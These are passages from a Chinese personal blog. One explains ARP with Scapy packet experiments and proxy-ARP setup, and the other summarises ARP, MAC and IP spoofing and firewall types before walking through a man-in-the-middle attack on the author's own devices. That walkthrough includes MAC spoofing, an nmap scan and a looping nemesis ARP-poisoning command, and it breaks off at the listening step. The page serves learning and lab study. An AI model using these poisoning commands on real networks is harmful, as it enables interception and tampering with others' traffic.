<pre><code> ~ ⮀ sudo  tcpdump -nni eth0 arp 
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">17</span>:<span class="number">22</span>:<span class="number">10.465636</span> ARP, Reply <span class="number">172.16</span><span class="number">.0</span><span class="number">.28</span> <span class="keyword">is</span>-<span class="keyword">at</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, <span class="keyword">length</span> <span class="number">28</span></span>
</code></pre><p>然而检查另一台机器的arp缓存可能并没有<code>172.16.0.28</code>的项。这是因为操作系统可能不欢迎不请自来的arp应答。</p>
<p>我们试着使用不请自来的arp请求看看：</p>
<pre><code>&gt;&gt;&gt; arp_request = <span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'172.16.0.22'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp</span><span class="params">(arp_request)</span></span>
</code></pre><p>则可以在另一台机器上的缓存表中发现<code>172.16.0.22</code>的项。说明操作系统默默接受了不请自来的请求。</p>
<p>为了查看ARP响应的效果，我们同时打开两边机器，创造一个请求。先清空windows机器的缓存表。</p>
<p>我们让windows机器ping<code>172.16.0.30</code>。同时开始抓包和准备应答(在win7上ping的同时执行下列命令)：</p>
<pre><code>&gt;&gt;&gt; arp_reply = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">'C8:1F:66:05:E2:6A'</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'C8:1F:66:05:E2:6A'</span>, psrc=<span class="string">'172.16.0.30'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp</span><span class="params">(arp_reply, timeout=<span class="number">1</span>, iface=<span class="string">'eth0'</span>)</span><span class="title">Begin</span></span> emission:
Finished to send <span class="number">1</span> packets.
...
Received <span class="number">3</span> packets, got <span class="number">0</span> answers, remaining <span class="number">1</span> packets
</code></pre><p>可以观察到包的前两个正是我们想要的。</p>
<pre><code>~ ⮀ <span class="tag">sudo</span>  <span class="tag">tcpdump</span> <span class="tag">-nni</span> <span class="tag">eth0</span> <span class="tag">arp</span> 
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
17<span class="pseudo">:28</span><span class="pseudo">:55</span><span class="class">.041968</span> <span class="tag">ARP</span>, <span class="tag">Request</span> <span class="tag">who-has</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.30</span> <span class="tag">tell</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span>, <span class="tag">length</span> 46
17<span class="pseudo">:28</span><span class="pseudo">:55</span><span class="class">.165561</span> <span class="tag">ARP</span>, <span class="tag">Reply</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.30</span> <span class="tag">is-at</span> 11<span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span>, <span class="tag">length</span> 28
</code></pre><p>同时发现win7的arp缓存中已经有了<code>172.16.0.30</code>。</p>
<h2 id="ARP_Announcement">ARP Announcement</h2><p>这是一种特殊的ARP请求，目标协议地址填入发送者的协议地址，将目标硬件地址设为0.</p>
<p>或者，是一种特殊的ARP响应，目标协议地址和目标硬件地址都是发送者的协议和目标硬件地址。</p>
<p>ARP announcement意在更新其它收到这个包的机器的ARP缓存。这种免费的ARP(不请自来)常用来在机器启动或换网卡时通知其它机器。也用来做负载平衡。</p>
<pre><code>&gt;&gt;&gt; arp_announcement = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'00:00:00:00:00:00'</span>, psrc=<span class="string">'172.16.0.40'</span>, pdst=<span class="string">'172.16.0.40'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp1</span><span class="params">(arp_announcement, timeout=<span class="number">2</span>)</span></span>
Begin emission:
Finished to send <span class="number">1</span> packets.

Received <span class="number">0</span> packets, got <span class="number">0</span> answers, remaining <span class="number">1</span> packets

 ~ ⮀ sudo  tcpdump -enni eth0 arp 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">22</span>:<span class="number">15</span>:<span class="number">39.645293</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (<span class="number">0</span>x0806), length <span class="number">42</span>: Request who-has <span class="number">172.16</span>.<span class="number">0.40</span> tell <span class="number">172.16</span>.<span class="number">0.40</span>, length <span class="number">28</span>
</code></pre><p>遗憾的是，win7的ARP缓存没有接受<code>172.16.0.40</code>.</p>
<p>一个响应Announcement：</p>
<pre><code>&gt;&gt;&gt; arp_announcement = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'172.16.0.40'</span>, pdst=<span class="string">'172.16.0.40'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp1</span><span class="params">(arp_announcement, timeout=<span class="number">2</span>)</span></span>

 ~ ⮀ sudo  tcpdump -enni eth0 arp 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">22</span>:<span class="number">18</span>:<span class="number">21.655256</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (<span class="number">0</span>x0806), length <span class="number">42</span>: Reply <span class="number">172.16</span>.<span class="number">0.40</span> is-at <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, length <span class="number">28</span>
</code></pre><h2 id="ARP_probe">ARP probe</h2><p>ARP探针是一个全0 IP地址的广播请求，用来检测IPv4地址冲突。在开始使用一个IP地址之前，实现这个规范(RFC5227)的主机必须通过ARP探针测试地址是否被使用。</p>
<p>具体过程参见RFC5227.</p>
<blockquote>
<p>A host probes to see if an address is already in use by broadcasting<br>an ARP Request for the desired address.  The client MUST fill in the<br>‘sender hardware address’ field of the ARP Request with the hardware<br>address of the interface through which it is sending the packet.  The<br>‘sender IP address’ field MUST be set to all zeroes; this is to avoid<br>polluting ARP caches in other hosts on the same link in the case<br>where the address turns out to be already in use by another host.<br>The ‘target hardware address’ field is ignored and SHOULD be set to<br>all zeroes.  The ‘target IP address’ field MUST be set to the address<br>being probed.  An ARP Request constructed this way, with an all-zero<br>‘sender IP address’, is referred to as an ‘ARP Probe’.</p>
</blockquote>
<p>类似这样：</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; arp_probe = (<span class="constant">Ether</span>(dst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>)/<span class="constant">ARP</span>(psrc=<span class="string">'0.0.0.0'</span>, pdst=<span class="string">'172.16.0.17'</span>))
<span class="prompt">&gt;&gt;</span>&gt; arp_probe.show()
<span class="comment">###[ Ethernet ]###</span>
  dst= <span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span>ff
  src= <span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span>
  type= <span class="number">0x806</span>
<span class="comment">###[ ARP ]###</span>
     hwtype= <span class="number">0x1</span>
     ptype= <span class="number">0x800</span>
     hwlen= <span class="number">6</span>
     plen= <span class="number">4</span>
     op= who-has
     hwsrc= <span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span>
     psrc= <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>
     hwdst= <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span>
     pdst= <span class="number">172.16</span>.<span class="number">0</span>.<span class="number">17</span>
<span class="prompt">&gt;&gt;</span>&gt; recv = srp(arp_probe, iface=<span class="string">'eth0'</span>)
<span class="constant">Begin</span> <span class="symbol">emission:</span>
<span class="constant">Finished</span> to send <span class="number">1</span> packets.
*
<span class="constant">Received</span> <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets
</code></pre><p>开始监听然后发送：</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span>  <span class="tag">tcpdump</span> <span class="tag">-nni</span> <span class="tag">eth0</span> <span class="tag">arp</span> 
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
22<span class="pseudo">:08</span><span class="pseudo">:56</span><span class="class">.885470</span> <span class="tag">ARP</span>, <span class="tag">Request</span> <span class="tag">who-has</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span> <span class="tag">tell</span> 0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>, <span class="tag">length</span> 28
22<span class="pseudo">:08</span><span class="pseudo">:56</span><span class="class">.885831</span> <span class="tag">ARP</span>, <span class="tag">Reply</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span> <span class="tag">is-at</span> <span class="tag">c8</span><span class="pseudo">:1f</span><span class="pseudo">:66</span><span class="pseudo">:05</span><span class="pseudo">:e2</span><span class="pseudo">:6a</span>, <span class="tag">length</span> 46
</code></pre><p>说明有<code>172.16.0.17</code>这个地址。但可以检查一下，<code>0.0.0.0</code>并没有污染win7机器的arp缓存。</p>
<h2 id="ARP_mediation">ARP mediation</h2><p>在VPN中不同网络架构时使用ARP。略</p>
<h2 id="ARP_Stuffing">ARP Stuffing</h2><p>某些嵌入式系统，没有配置界面，用户无法使用地址分配协议，设备没有合适的IP地址，这时候主机人工填充一个IP地址到它的地址表，然后向设备发送特殊的包。设备于是采用这个IP地址和主机通信。</p>
<h2 id="ARP_Suppression">ARP Suppression</h2><p>禁用主机ARP，要求配置静态ARP缓存才能通信：</p>
<pre><code>ip link <span class="keyword">set</span> dev eth0 arp <span class="keyword">off</span>
<span class="comment"># ifconfig wlan0 -arp</span>
</code></pre><h2 id="ARP_Proxy">ARP Proxy</h2><p>同一个IP网段被某台设备分成两个部分。arp代理可以让两端的机器好像在同一以太网内工作一样。</p>
<p>举如下例子。</p>
<p>当我们有一台linux机器。其中wlan0连接无线路由，另外有一台win7机器，没有无线网卡，和linux机器的eth0直接用网线相连。</p>
<pre><code><span class="comment">Internet</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">无线路由</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">wlan0</span> <span class="title">[</span><span class="comment">Linux</span><span class="title">]</span> <span class="comment">eth0</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">windows</span> <span class="comment">7</span>
</code></pre><p>为了让windows7机器能够联网，我们可以设置windows7机器和linux机器在同一网段。比如设置：</p>
<p>先设置ip地址：</p>
<ul>
<li>路由器网关地址<code>192.168.1.1</code></li>
<li>linux在wlan0被路由器分配地址，<code>192.168.1.103</code>，子网掩码<code>255.255.255.0</code></li>
<li>windows7机器设置静态ip<code>192.168.1.114</code>，子网掩码<code>255.255.255.0</code></li>
</ul>
<p>下面我们开始设置ARP代理，在linux机器上设置内核允许代理和转发：</p>
<pre><code>gentoo ~ # echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/conf/eth0/proxy_arp<span class="symbol">
gentoo</span> ~ #<span class="symbol"> echo</span> 1 &gt; /<span class="keyword">proc</span>/sys/net/ipv4/conf/wlan0/proxy_arp<span class="symbol">
gentoo</span> ~ #<span class="symbol"> echo</span> 1 &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward
</code></pre><p>在wlan0上对应其MAC设置想要代理的对象的静态地址(<code>192.168.1.114</code>)，让linux对wlan0上以太网响应对<code>192.168.1.114</code>的响应，并把自己的无线网卡MAC作为响应内容。</p>
<pre><code>sudo arp -i wlan0 -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> pub
</code></pre><p>可以选择是否设置下一步，即使在eth0上没有ip地址也可以。</p>
<p>设置eth0接口上的ip地址(默认netmask是<code>255.255.255.0</code>)：</p>
<pre><code>sudo ifconfig eth0 inet <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
</code></pre><p>添加路由：</p>
<pre><code>sudo route add <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> eth0
</code></pre><p>linux和windows机器互ping以确保连接：</p>
<pre><code>⮀ ~ ⮀ ping -c <span class="number">2</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.446</span> ms
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.469</span> ms

--- <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> ping statistics ---
<span class="number">2</span> packets transmitted, <span class="number">2</span> received, <span class="number">0</span>% packet loss, time <span class="number">999</span>ms
rtt min/avg/max/mdev = <span class="number">0.446</span>/<span class="number">0.457</span>/<span class="number">0.469</span>/<span class="number">0.024</span> ms
</code></pre><p>对<code>eth0</code>上将自己的有线网卡MAC设置为对<code>192.168.1.1</code>的响应。</p>
<pre><code>sudo arp -i eth0 -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">00</span>:<span class="number">24</span>:<span class="number">54</span>:<span class="number">9</span>a:<span class="number">05</span>:<span class="number">8</span>b pub
</code></pre><p>接着在windows7上尝试<code>ping</code>一下<code>192.168.1.1</code>：</p>
<p>如果在windows7机器上设置了正确的dns，就可以直接上网了。</p>
<h2 id="Reference">Reference</h2><ul>
<li><a href="en.wikipedia.org/wiki/Address_Resolution_Protocol">Address Resolution Protocol</a></li>
<li><a href="http://linux-ip.net/html/ether-arp.html" target="_blank" rel="external">Address Resolution Protocol (ARP)</a></li>
<li><a href="http://linux.vbird.org/linux_server/0230router.php#arp_proxy" target="_blank" rel="external">特殊狀況：路由器兩邊界面是同一個 IP 網段： ARP Proxy</a></li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/security/2014/02/26/spoofing/" itemprop="url">
                  网络上的欺骗
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-02-26T00:00:00+08:00" content="2014-02-26">
              2014-02-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/security/" itemprop="url" rel="index">
                    <span itemprop="name">security</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/security/2014/02/26/spoofing/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="security/2014/02/26/spoofing/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>首先，我们来被维基百科科普一下。然后试着执行一次中间人攻击。</p>
<h1 id="理论基础">理论基础</h1><ul>
<li><p>理解计算机网络分层架构。</p>
</li>
<li><p>习惯于主动使用搜索引擎寻找知识</p>
</li>
</ul>
<p>以下内容来自维基百科</p>
<h1 id="Arp_Spoofing">Arp Spoofing</h1><p>是一种攻击者在局域网上发送伪造的ARP消息的技术。通常是为了将另一个主机的IP地址关联到攻击者的MAC地址上。使那个主机的IP地址的流量定向到攻击者那里。</p>
<p>ARP欺骗使攻击者截取本地局域网(LAN)上的数据帧，更改流量或者阻止流量。通常作为其它攻击方式比如拒绝服务攻击(DOS)，中间人攻击(MITM)或者会话劫持的开始。</p>
<p>攻击局限在使用ARP协议的局域网上。</p>
<p>局域网通信需要把网络层的IP地址转换成数据链路层的MAC地址<br>来在数据链路层传输。当知道一个主机的IP地址后，就需要通过一个广播来获取其MAC地址(ARP request)。这个主机响应(ARP reply)中包含这个IP的MAC地址。</p>
<p>ARP协议没有状态，主机会自动缓存任何它们收到的ARP reply，无论是否它们请求过。即使没有过期的ARP缓存也会被新ARP响应覆盖。主机无法认证包的来源。</p>
<p>通常，一次ARP攻击可能来自被侵害的机器或者直接是攻击者的主机。通常，攻击的目标是将攻击者的MAC地址关联到目标机器的IP地址，于是意味着发送到目标的流量就被送到攻击者的那里。攻击者可以：</p>
<ul>
<li>截取数据，然后原封不动转发给目标。(窃听)</li>
<li>更改数据内容再转发给目标(MITM)</li>
<li>通过丢弃所有或部分包对目标发起DOS攻击</li>
</ul>
<p>防御措施有：</p>
<ul>
<li>静态ARP表。</li>
<li>一些软件通过某种形式的认证或交叉检查ARP响应的方式。DHCP服务器、独立主机、Ethernet交换机或其它网络设备都能有这种功能。比如多IP关联到一个MAC地址可能就预示着ARP欺骗。</li>
<li>操作系统反应不一。Linux忽略任何不请自来的响应，但使用其它机器的可见请求来更新缓存。Solaris只在超时后更新缓存条目。Windows中，可以在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters, ArpCachelife, ArpCacheMinReferencelife, ArpUseEtherSNAP, ArpTRSingleRoute, ArpAlwaysSourceRoute, ArpRetryCount</code>配置。</li>
<li>主机防御。可能拒绝任何和缓存中MAC地址不同的应答更新，可能接受不同的但会探测之前的MAC地址是否还在。这些是基于已有的缓存中MAC地址是合法的基础上。<a href="一般通过dhcp服务器分配ip地址的大概就没什么问题。不过要是伪造dhcp服务器……啧啧……">^4</a></li>
<li>被动探测。探测网络上的ARP请求和响应建立一个IP-MAC数据库</li>
<li>DHCP服务器在分配IP后建立和维护对应的列表供网关使用。</li>
</ul>
<h1 id="Mac_Spoofing">Mac Spoofing</h1><p>是一种更改一个网络设备上接口的MAC(Media Access Control)地址的技术。MAC地址硬编码到网卡(NetWork Interface Controller)中无法更改，然而，有办法让操作系统相信网卡使用了用户指定的MAC地址。通常这更改了一个电脑的身份，然而相当简单。</p>
<p>通常为了绕过服务器或路由器的访问控制列表，或者隐藏一台电脑或者冒充其它网络设备。看情况有时候合法有时候非法。</p>
<ul>
<li>为了在使用绑定MAC的ISP上使用新硬件或多个硬件。不过攻击者也能使用该技术。</li>
<li>为了满足某些绑定MAC地址的软件要求</li>
<li>身份隐藏以保护隐私。Wi-Fi连接MAC地址并不加密。因此monitor模式下网卡很容易搜集MAC地址。为了不被追踪可以使用MAC欺骗，然而攻击者可以用此技术冒充认证用户实行非法活动，并且难以探测。</li>
</ul>
<p>MAC欺骗的主机通常可以收到信息(有些特别安全交换机配置可以阻止这种包的传输)<a href="我拿自己手机试了下，大概这种特安全的地方很少吧。">^2</a>，然而，MAC地址伪造局限在局部广播域。<a href="[这里解释了为啥是在局域网内](http://stackoverflow.com/questions/10633753/nmap-not-retrieving-mac-address-and-vendor)">^3</a></p>
<h1 id="IP_Spoofing">IP Spoofing</h1><p>是在IP协议包中伪造源地址的一种行为。其一是为了隐藏伪造者的身份，一是为了假扮成其它机器。</p>
<p>攻击者通过更改IP包头源地址段，使之好像来源于其它机器。收到伪造包的机器就向错误的机器返回包。通常攻击者不在乎返回的包，或者他们可以可靠地探测响应。</p>
<p>特定情况下可能攻击者可以看到或把数据包重定向到他自己的机器。这在本地局域网或本地无线局域网上常常发生。</p>
<p>IP欺骗常用来进行DOS攻击，因为包来自不同地址，它让过滤变得不易。这让基于IP的防御不再有效。Backscatter是一种基于无效地址包的统计技术，然而更复杂的攻击还能避免无效的地址。</p>
<p>IP欺骗也被用来绕过基于IP的认证。虽然这种方法会一次更改上千的包使之在攻击远端系统时实施非常困难，但在受信任的内网机器之间却很有效</p>
<p>IP欺骗有时候也用作网站性能测试。</p>
<p>易受IP欺骗的服务有：</p>
<ul>
<li>RPC</li>
<li>任何基于IP的认证</li>
<li>X window系统</li>
<li>R(emote)系列服务比如rlogin，rsh</li>
</ul>
<h3 id="防御方式">防御方式</h3><ul>
<li>包过滤。网关对出口或者入口包进行IP地址过滤，比如urpf(unicast Reverse Path Forwarding)。</li>
<li>设计不是基于IP的网络协议和服务</li>
<li>一些上层协议提供一些抵御。比如TCP使用序号来和远端机器通信来确保到达的包是已经建立连接的一部分。因攻击者通常看不到任何回应包，必须猜测序号来劫持连接。一些较老的系统或网络设备的TCP序号可以被预测。</li>
</ul>
<h1 id="Email_Spoofing">Email Spoofing</h1><p>以后再看，其实某次我们内网搭建的git服务器给我邮箱发了邮件并且收到时就想到了这个。</p>
<h1 id="URL_Spoofing">URL Spoofing</h1><p>以后再说吧，想起了乌云上那篇猥琐流URL hacking。</p>
<h1 id="FireWall">FireWall</h1><p>从发展史来看，防火墙的发展分为三代：</p>
<ol>
<li><p>包过滤。这一代防火墙仅仅对单个的包进行过滤。如果发现匹配的规则则丢弃(悄悄丢包)或者拒绝(返回错误)这个包。通常这些规则是包源地址、目的地址、协议、和比如针对TCP和UDP的端口。它没有关于连接的任何信息，是无状态的。</p>
<p> 该代防火墙主要工作在下三层并稍微偷看下传输层的源和目的地址及端口。</p>
</li>
<li><p>有状态的过滤。不仅有第一代防火墙的功能，还工作到OSI第四层传输层上，会把<code>连接状态</code>作为一个评价标准。它会保留直到接受足够的包来决定它的连接状态。它记录所有经过的连接并决定是否一个包是新连接的开始或是已存在连接的一部分或者不是。</p>
</li>
<li><p>应用级防火墙<a href="SDN么这是？">^1</a>。这种防火墙工作在应用层。它能够理解上层协议，所以，可以去探测是否一个非法的协议在试图通过合法的端口穿越防火墙。传说中的下一代防火墙(NGFW)就是扩展和深化应用层栈的检查。</p>
</li>
</ol>
<p>防火墙可以根据通信被截取的位置和被追踪的状态分类：</p>
<ul>
<li><p>网络层或包过滤<br> 主要工作在相对底层的TCP/IP层，靠规则过滤。有两种：</p>
<ul>
<li>有状态：存储当前连接阶段，源目的地址端口。若一个包不属于已经存在的连接，通过新连接的规则评价它。如果一个包属于已知的连接，则按所在连接处理方式处理</li>
<li>无状态。需要更少内存、更快。适于处理无连接的协议。然而不能基于通信状态做出复杂决定。<br>一个例子就是iptables</li>
</ul>
</li>
<li><p>应用层防火墙：通过套接字截取进程间通信，使用各种规则过滤。无法抵御底层的漏洞挖掘，正在被一种强制访问控制(MAC)应用防火墙取代，即沙盒。</p>
</li>
<li><p>代理：无论是专用的硬件或者软件，通过以应用的方式响应输入的包起作用。代理服务器是一个网络到另一个特定网络应用的网关，代表网络中的用户来行事。代理服务器使内网和外网隔离更彻底，但攻击者也可以通过使用一台机器当作代理攻击内部网络。</p>
</li>
<li><p>NAT——网络地址转换：防火墙通常有这些功能，防火墙后的机器通常拥有私有IP地址。本来用来减缓ipv4地址不够用的危机的措施，却意外成为一种反网络侦查的重要防御手段。</p>
</li>
</ul>
<h1 id="Rogue_DHCP">Rogue DHCP</h1><p>伪造DHCP服务器，暂略。</p>
<h1 id="DNS系列">DNS系列</h1><p>放到DNS里来讲</p>
<hr>
<p>下面，尝试一次中间人攻击，我是在WLAN内打开自己手机和笔记本。</p>
<p>0.0 mac spoofing</p>
<pre><code>~ ⮀ sudo ip link <span class="built_in">set</span> eth0 down
~ ⮀ sudo ip link <span class="built_in">set</span> dev eth0 address <span class="number">38</span>:AA:<span class="number">3</span>C:E6:FE:<span class="number">69</span>
~ ⮀ ip link <span class="built_in">set</span> eth0 up
</code></pre><p>0.1 prepare</p>
<pre><code>~ ⮀ ifconfig wlan0 promisc
~ ⮀ echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward
</code></pre><ol>
<li><p>find target machine</p>
<p> ~ ⮀ sudo nmap -sS 192.168.1.0/24</p>
</li>
<li><p>arps it</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">sudo nemesis arp -v -r <span class="operator">-d</span> wlan0 -S <span class="number">192.168</span>.<span class="number">1.102</span> -D <span class="number">192.168</span>.<span class="number">1.1</span> -h E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -m EC:<span class="number">88</span>:<span class="number">8</span>F:B4:D6:<span class="number">68</span> -H  E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -M EC:<span class="number">88</span>:<span class="number">8</span>F:B4:D6:<span class="number">68</span></span><br><span class="line"></span><br><span class="line">sudo nemesis arp -v -r <span class="operator">-d</span> wlan0 -S <span class="number">192.168</span>.<span class="number">1.1</span> -D <span class="number">192.168</span>.<span class="number">1.102</span> -h E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -m <span class="number">68</span>:<span class="number">5</span>D:<span class="number">43</span>:<span class="number">2</span>E:AA:<span class="number">59</span> -H  E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -M <span class="number">68</span>:<span class="number">5</span>D:<span class="number">43</span>:<span class="number">2</span>E:AA:<span class="number">59</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>listen it</p>
